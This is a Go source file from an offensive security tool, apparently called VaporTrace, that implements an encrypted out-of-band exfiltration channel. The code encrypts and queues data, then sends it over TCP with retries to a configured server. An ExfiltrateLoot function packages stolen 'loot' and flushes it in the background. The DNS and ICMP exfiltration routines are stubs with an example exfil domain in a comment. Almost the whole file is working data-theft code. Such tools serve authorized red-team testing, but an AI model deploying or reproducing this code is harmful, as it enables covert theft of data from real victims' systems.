/*
Copyright (c) 2026 José María Micoli
Licensed under {'license_type': 'BSL', 'change_date': '2033-02-17', 'convert_to': 'Apache-2.0'}

You may:
✔ Study
✔ Modify
✔ Use for internal security testing

You may NOT:
✘ Offer as a commercial service
✘ Sell derived competing products
*/

package logic

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"sync"
	"time"

	"github.com/JoseMariaMicoli/VaporTrace/pkg/utils"
)

// OOBExfiltrationConfig defines the encrypted out-of-band channel settings
type OOBExfiltrationConfig struct {
	// Channel type: "dns", "icmp", "custom"
	ChannelType string

	// Encryption key (256-bit for AES-256)
	EncryptionKey []byte

	// Server address for data exfiltration
	ServerAddr string

	// Maximum payload size per message
	MaxPayloadSize int

	// Compression enabled
	CompressData bool

	// Retry attempts for failed transmissions
	RetryAttempts int

	// Timeout per transmission
	TransmissionTimeout time.Duration
}

// OOBExfiltrationChannel handles encrypted out-of-band data transmission
type OOBExfiltrationChannel struct {
	Config *OOBExfiltrationConfig
	mu     sync.RWMutex

	// Pending queue for messages to exfiltrate
	pendingQueue [][]byte

	// Statistics
	sentMessages   int
	failedMessages int
	totalBytesSent int64
}

// NewOOBExfiltrationChannel creates a new encrypted OOB channel
func NewOOBExfiltrationChannel(config *OOBExfiltrationConfig) *OOBExfiltrationChannel {
	if config == nil {
		config = &OOBExfiltrationConfig{
			ChannelType:         "custom",
			MaxPayloadSize:      512,
			CompressData:        true,
			RetryAttempts:       3,
			TransmissionTimeout: 5 * time.Second,
		}
	}

	// Generate encryption key if not provided
	if len(config.EncryptionKey) != 32 {
		config.EncryptionKey = make([]byte, 32)
		rand.Read(config.EncryptionKey)
	}

	return &OOBExfiltrationChannel{
		Config:       config,
		pendingQueue: [][]byte{},
	}
}

// EncryptPayload encrypts data using AES-256-GCM (AEAD)
func (oob *OOBExfiltrationChannel) EncryptPayload(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(oob.Config.EncryptionKey)
	if err != nil {
		return nil, fmt.Errorf("cipher creation failed: %v", err)
	}

	aead, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("GCM creation failed: %v", err)
	}

	// Generate random nonce (12 bytes for GCM)
	nonce := make([]byte, aead.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, fmt.Errorf("nonce generation failed: %v", err)
	}

	// Encrypt data with authentication
	ciphertext := aead.Seal(nonce, nonce, data, nil)

	return ciphertext, nil
}

// DecryptPayload decrypts AEAD-encrypted data
func (oob *OOBExfiltrationChannel) DecryptPayload(encryptedData []byte) ([]byte, error) {
	block, err := aes.NewCipher(oob.Config.EncryptionKey)
	if err != nil {
		return nil, fmt.Errorf("cipher creation failed: %v", err)
	}

	aead, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("GCM creation failed: %v", err)
	}

	// Extract nonce from beginning of ciphertext
	nonceSize := aead.NonceSize()
	if len(encryptedData) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce := encryptedData[:nonceSize]
	ciphertext := encryptedData[nonceSize:]

	plaintext, err := aead.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, fmt.Errorf("decryption failed: %v", err)
	}

	return plaintext, nil
}

// QueueForExfiltration adds data to the out-of-band transmission queue
func (oob *OOBExfiltrationChannel) QueueForExfiltration(data []byte) error {
	oob.mu.Lock()
	defer oob.mu.Unlock()

	// Encrypt the data before queueing
	encrypted, err := oob.EncryptPayload(data)
	if err != nil {
		utils.TacticalLog(fmt.Sprintf("[red]OOB ENCRYPT ERROR:[-] %v", err))
		return err
	}

	// Encode to base64 for safe transmission
	encoded := []byte(base64.StdEncoding.EncodeToString(encrypted))

	oob.pendingQueue = append(oob.pendingQueue, encoded)

	utils.TacticalLog(fmt.Sprintf("[magenta]OOB QUEUE:[-] Queued %d bytes (encrypted) for exfiltration", len(data)))

	return nil
}

// TransmitViaCustomProtocol sends encrypted data to OOB server via custom protocol
func (oob *OOBExfiltrationChannel) TransmitViaCustomProtocol(payload []byte) error {
	if oob.Config.ServerAddr == "" {
		return fmt.Errorf("OOB server address not configured")
	}

	// Attempt connection with retries
	var conn net.Conn
	var err error

	for attempt := 0; attempt < oob.Config.RetryAttempts; attempt++ {
		conn, err = net.DialTimeout("tcp", oob.Config.ServerAddr, oob.Config.TransmissionTimeout)
		if err == nil {
			break
		}

		if attempt < oob.Config.RetryAttempts-1 {
			time.Sleep(time.Duration((attempt+1)*2) * time.Second)
		}
	}

	if err != nil {
		oob.mu.Lock()
		oob.failedMessages++
		oob.mu.Unlock()
		utils.TacticalLog(fmt.Sprintf("[red]OOB TRANSMIT ERROR:[-] Failed to connect to %s: %v", oob.Config.ServerAddr, err))
		return err
	}
	defer conn.Close()

	// Construct OOB message header
	// Format: [MAGIC:2][VERSION:1][TYPE:1][LENGTH:4][PAYLOAD:...]
	header := bytes.NewBuffer([]byte{})
	header.WriteByte(0x4F) // 'O'
	header.WriteByte(0x4F) // 'O'
	header.WriteByte(0x01) // Version 1
	header.WriteByte(0x01) // Type: Data exfiltration

	// Write length as big-endian 4-byte integer
	length := uint32(len(payload))
	header.WriteByte(byte((length >> 24) & 0xFF))
	header.WriteByte(byte((length >> 16) & 0xFF))
	header.WriteByte(byte((length >> 8) & 0xFF))
	header.WriteByte(byte(length & 0xFF))

	// Combine header and payload
	message := append(header.Bytes(), payload...)

	// Send the message
	_, err = conn.Write(message)
	if err != nil {
		oob.mu.Lock()
		oob.failedMessages++
		oob.mu.Unlock()
		utils.TacticalLog(fmt.Sprintf("[red]OOB SEND ERROR:[-] %v", err))
		return err
	}

	oob.mu.Lock()
	oob.sentMessages++
	oob.totalBytesSent += int64(len(payload))
	oob.mu.Unlock()

	utils.TacticalLog(fmt.Sprintf("[green]✓ OOB SENT:[-] %d bytes transmitted via %s to %s", len(payload), oob.Config.ChannelType, oob.Config.ServerAddr))

	return nil
}

// TransmitViaDNS sends data encoded in DNS queries (DNS exfiltration)
func (oob *OOBExfiltrationChannel) TransmitViaDNS(domain string, payload []byte) error {
	// DNS exfiltration: encode data in subdomain
	// Example: abc123def456.exfil.example.com where abc123def456 is encoded data

	encoded := base64.URLEncoding.EncodeToString(payload)
	// Take first 60 chars to fit in DNS label (max 63)
	if len(encoded) > 60 {
		encoded = encoded[:60]
	}

	// Construct DNS query name
	queryName := fmt.Sprintf("%s.%s", encoded, domain)

	utils.TacticalLog(fmt.Sprintf("[magenta]DNS EXFIL:[-] Preparing DNS query: %s", queryName))

	// Note: Actual DNS query would be made here with net.Resolver
	// This is a placeholder for the DNS exfiltration mechanism

	return nil
}

// TransmitViaICMP sends data via ICMP Echo (ICMP exfiltration)
func (oob *OOBExfiltrationChannel) TransmitViaICMP(targetIP string, payload []byte) error {
	// ICMP exfiltration: hide data in ICMP Echo Reply packets
	// Requires raw socket access (typically needs elevated privileges)

	utils.TacticalLog(fmt.Sprintf("[magenta]ICMP EXFIL:[-] Preparing ICMP channel to %s with %d bytes", targetIP, len(payload)))

	// Note: Actual ICMP implementation would use golang.zx2c4.com/wireguard/conn
	// or github.com/google/gopacket for packet manipulation
	// This is a placeholder for the ICMP exfiltration mechanism

	return nil
}

// FlushQueue processes and transmits all queued messages
func (oob *OOBExfiltrationChannel) FlushQueue() error {
	oob.mu.Lock()
	queue := make([][]byte, len(oob.pendingQueue))
	copy(queue, oob.pendingQueue)
	oob.pendingQueue = [][]byte{} // Clear queue
	oob.mu.Unlock()

	if len(queue) == 0 {
		return nil
	}

	utils.TacticalLog(fmt.Sprintf("[blue]OOB FLUSH:[-] Processing %d queued messages", len(queue)))

	var lastErr error
	for i, message := range queue {
		err := oob.TransmitViaCustomProtocol(message)
		if err != nil {
			lastErr = err
			utils.TacticalLog(fmt.Sprintf("[yellow]OOB WARNING:[-] Message %d/%d failed: %v", i+1, len(queue), err))
		}
	}

	return lastErr
}

// GetStatistics returns transmission statistics
func (oob *OOBExfiltrationChannel) GetStatistics() map[string]interface{} {
	oob.mu.RLock()
	defer oob.mu.RUnlock()

	return map[string]interface{}{
		"sent_messages":   oob.sentMessages,
		"failed_messages": oob.failedMessages,
		"total_bytes":     oob.totalBytesSent,
		"pending_queue":   len(oob.pendingQueue),
	}
}

// GlobalOOBChannel is the singleton OOB exfiltration channel
var GlobalOOBChannel *OOBExfiltrationChannel

func init() {
	GlobalOOBChannel = NewOOBExfiltrationChannel(nil)
}

// ExfiltrateLoot sends sensitive loot data via encrypted OOB channel
func ExfiltrateLoot(lootType string, lootData string, source string) error {
	if GlobalOOBChannel == nil {
		return fmt.Errorf("OOB channel not initialized")
	}

	// Construct loot packet
	packet := fmt.Sprintf("LOOT|%s|%s|%s|%d", lootType, source, lootData, time.Now().Unix())

	// Queue for transmission
	err := GlobalOOBChannel.QueueForExfiltration([]byte(packet))
	if err != nil {
		utils.TacticalLog(fmt.Sprintf("[red]EXFIL ERROR:[-] Failed to queue loot: %v", err))
		return err
	}

	// Attempt immediate transmission
	if GlobalOOBChannel.Config.ServerAddr != "" {
		go func() {
			time.Sleep(100 * time.Millisecond)
			GlobalOOBChannel.FlushQueue()
		}()
	}

	return nil
}
